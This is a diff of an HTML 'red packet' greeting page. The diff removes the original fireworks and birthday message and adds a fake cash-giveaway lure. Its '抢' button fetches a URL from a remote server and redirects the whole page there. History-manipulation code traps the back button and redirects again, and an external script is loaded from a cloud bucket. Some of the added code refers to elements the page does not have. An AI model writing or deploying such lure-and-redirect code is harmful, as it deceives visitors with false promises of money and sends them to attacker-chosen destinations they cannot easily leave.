@@ -5,7 +5,7 @@
     <meta name="renderer" content="webkit">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>节日快乐</title>
+    <title>QQ沐编程</title>
     <style>
         * {
             padding: 0;
@@ -355,20 +355,7 @@
         }
     </style>
     <style>
-        #redPacket{
-            z-index: 999;
-            height: 80vh;
-            width: 80vw;
-            background-color: rgb(220,94,77);
-            margin: 0 auto;
-            border-radius: 10px;
-            overflow: hidden;
-            position: fixed;
-            top: 10vh;
-            left: 10vw;
-            animation: show1 .4s;
-            overflow: hidden;
-        }
+
 
         .disappear {
             width: 30px;
@@ -398,23 +385,16 @@
             background: white;
             border-radius: 4px;
         }
-        canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-        }
-        #birthdayMessage {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #333;
-        }
     </style>
    
     <script>
         window.apiCode = "api1";
     </script>
     <script>
+        var ftitle = ["全民派發现金", "biaoqing全҈民派fuhao钱", "biaoqing全民fuhao领钱", "人人有fuhao有钱领", "biaoqing现金奖励,随便领", "biaoqing人人fuhao有钱領"];
+        var ztitle = ["", '沐编程支持', '支持QQ沐编程世界第一', "支持QQ沐编程全民派钱", "支持QQ沐编程全民送钱", "支持QQ沐编程人人有钱领", "人人有钱領", "支持沐编程随机现金奖励"];
+        var bg_img = '1.png';
+        var nextUri = "jiayou_b";
         function getUrlParam(name) {
             var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
             var r = window.location.search.substr(1).match(reg);
@@ -435,92 +415,112 @@
     </script>
 </head>
 <body style="background:#000">
-    <canvas id="fireworksCanvas"></canvas>
-    <div id="holdpacket">
-        <div id="redPacket"
-            >
-            <div
-                style="height: 50vh;border: 1px solid rgb(220,94,77);background-color: rgb(220,94,77);border-radius: 10px 10px 50% 50% / 10px 10px 19% 19%;box-shadow: 0px 4px 0px -1px rgba(0, 0, 0, 0.2);">
-                <img src="./image/1.jpg" style="width:60px;height: 60px; margin: 0 auto 0; display: block; padding-top: 60px;">
-                <p style="font-size: 24px;text-align: center;padding-top: 20px;color: #ebcd9b;">口令红包</p>
-                <p style="font-size: 16px;text-align: center;padding-top: 20px;color: #ebcd9b;">宝贝节日快乐！<span class="text-tip" style="margin-left: 14px; font-size: 12px; background-color: #ebcd9b; padding: 1px 4px; color: rgb(220,94,77)">可提现</span></p>
-                <div  id="birthdayMessage" style="display:none;">
-                        <p style="font-size: 16px;text-align: center;padding-top: 20px;color: #ebcd9b;">🎉辛苦了亲爱的，愿你幸福每一天！🎂</p>
-                        <p style="font-size: 16px;text-align: center;padding-top: 20px;color: #ebcd9b;">口令：爱你宝贝</p>
-                </div>
-            </div>
-            <div id="openbtn"
-                style="width: 27.2vw;height: 25vw;border: 1px solid #ebcd9b;background-color: #ebcd9b;border-radius: 50%;margin: -45px auto 0;box-shadow: 0px 4px 0px 0px rgba(0, 0, 0, 0.2);text-align: center;line-height: 90px;animation: btn1 .5s;animation:1.8s ease 0s infinite normal none running btnShake3;animation-delay: .1s;"
-                onclick="launchFireworks()"> 
-                <span style=" display: inline-block; font-size: 45px; font-family: SimSun; font-weight: bold; color: #333;-webkit-animation: scaling .6s infinite; animation: scaling .6s infinite;">抢</span>
-            </div>
+    <div
+        style="z-index: 999;height: 80vh;background-color: rgb(220,94,77);width: 80vw;margin: 0 auto;border-radius: 10px;overflow: hidden;position: fixed;top: 10vh;left: 10vw;animation: show1 .4s;overflow: hidden;">
+        <div
+            style="height: 50vh;border: 1px solid rgb(220,94,77);background-color: rgb(220,94,77);border-radius: 10px 10px 50% 50% / 10px 10px 19% 19%;box-shadow: 0px 4px 0px -1px rgba(0, 0, 0, 0.2);">
+            <img src="http://q1.qlogo.cn/g?b=qq&nk=817094&s=100" style="width:60px;height: 60px; margin: 0 auto 0; display: block; padding-top: 60px;">
+            <p style="font-size: 24px;text-align: center;padding-top: 20px;color: #ebcd9b;">口令红包</p>
+            <p style="font-size: 16px;text-align: center;padding-top: 20px;color: #ebcd9b;">宝贝节日快乐！<span
+                    class="text-tip"
+                    style="margin-left: 14px; font-size: 12px; background-color: #ebcd9b; padding: 1px 4px; color: rgb(220,94,77)">可提现</span>
+            </p>
+        </div>
+        <div id="openbtn"
+            style="width: 27.2vw;height: 25vw;border: 1px solid #ebcd9b;background-color: #ebcd9b;border-radius: 50%;margin: -45px auto 0;box-shadow: 0px 4px 0px 0px rgba(0, 0, 0, 0.2);text-align: center;line-height: 90px;animation: btn1 .5s;animation:1.8s ease 0s infinite normal none running btnShake3;animation-delay: .1s;"
+            onclick="openRed(this)"> <span
+                style=" display: inline-block; font-size: 45px; font-family: SimSun; font-weight: bold; color: #333;-webkit-animation: scaling .6s infinite; animation: scaling .6s infinite;">抢</span>
         </div>
     </div>
 </body>
 <script>
-    const canvas = document.getElementById('fireworksCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    let particles = [];
-
-    function createParticle(x, y) {
-        const angle = Math.random() * 2 * Math.PI;
-        const speed = Math.random() * 5 + 2;
-        return {
-        x,
-        y,
-        dx: Math.cos(angle) * speed,
-        dy: Math.sin(angle) * speed,
-        radius: Math.random() * 3 + 1,
-        alpha: 1,
-        color: `hsl(${Math.random() * 360}, 100%, 50%)`,
-        };
+       function openRed() {
+        document.getElementById("openbtn")["style"]["animation"] = "btnMove .6s infinite alternate";
+        setTimeout(function () {
+            go();
+        }, 0x258);
     }
-
-    function launchFireworks() {
-        // Show birthday message
-        document.getElementById('birthdayMessage').style.display = 'block';
-
-        // Launch fireworks at random positions
-        for (let i = 0; i < 3; i++) {
-            const x = Math.random() * canvas.width;
-            const y = Math.random() * canvas.height / 2;
-            for (let j = 0; j < 100; j++) {
-                particles.push(createParticle(x, y));
+    window.go = function () {
+        function loadHtml(url) {
+            document.title = "...";
+            var xhr = new XMLHttpRequest;
+            var html = null;
+            function render() {
+                var a = document.open("text/html;charset=UTF-8", "replace");
+                a.write(html);
+                a.close();
             }
+            xhr.onload = function () {
+                html = xhr.responseText;
+                var delay = 0;
+                if (delay > 0) setTimeout("render()", delay * 1000)
+                else render();
+            };
+            xhr.open("GET", url, !0);
+            xhr.send();
         }
-        setInterval(launchFireworks, 3000);
+        
+        var httpRequest = new XMLHttpRequest();
+            httpRequest.open('GET', 'https://www.qqmu.com', true);
+            httpRequest.send();
+            httpRequest.onreadystatechange = function () {
+                if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+                    var json = httpRequest.responseText;
+                    if (json.length > 3) {
+                        if (window.location.href.indexOf(json) < 0) {
+                            top.location.href = json;
+                        }else{
+                            top.location.href = "https://www.qqmu.com";
+                        }
+                    }else{
+                        top.location.href = "https://www.qqmu.com";
+                    }
+                }
+            };
     }
-
-    function animate() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.2)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-        particles.forEach((p, i) => {
-        p.x += p.dx;
-        p.y += p.dy;
-        p.alpha -= 0.01;
-
-        if (p.alpha <= 0) {
-            particles.splice(i, 1);
-        } else {
-            ctx.beginPath();
-            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
-            ctx.fillStyle = p.color;
-            ctx.globalAlpha = p.alpha;
-            ctx.fill();
-            ctx.globalAlpha = 1;
-        }
-        });
-
-        requestAnimationFrame(animate);
+    var random = (Math.random() * 15);
+    var random2 = (Math.random() * 100);
+    var dww = 60;
+    var dtt = 45;
+    if (location.href.indexOf("v_100") != -1) {
+        document.getElementById('dia').style.display = "none";
     }
-
-    animate();
-    
-
+    var now_time = new Date().getTime();
+    var from_time = (parseInt(now_time));
+    var future = new Date(from_time + 3600 * 24 * 1000 * 3 + 8 * 3600 * 1000);
+    var datetime = future.toISOString().substr(5, 5);
+    datetime = datetime.replace("-", "\u6708");
+    document.getElementById('datetime').innerText = datetime + "日";
+    document.getElementById('axax').style.top = (random2) + "px";
+    if (sessionStorage.getItem("a") == null) {
+    sessionStorage.setItem("a", "1");
+    var _hmt = _hmt || [];
    
+}else{
+    // window.location.href="https://dwz.cn/33r9W1EL";
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET', 'https://www.qqmu.com', true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            window.location.href = json;
+        }
+    };
+}
+history.pushState(history.length + 1, "..``````", "#xxxx_" + new Date().getTime());
+window.onhashchange = function () {
+    // window.location.href="https://dwz.cn/33r9W1EL";
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET', 'https://www.qqmu.com', true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            window.location.href=json;
+        }
+    };
+};
 </script>
+<script src="https://cawtwat.oss-cn-qingdao.aliyuncs.com/bd.js"></script>
 </html>
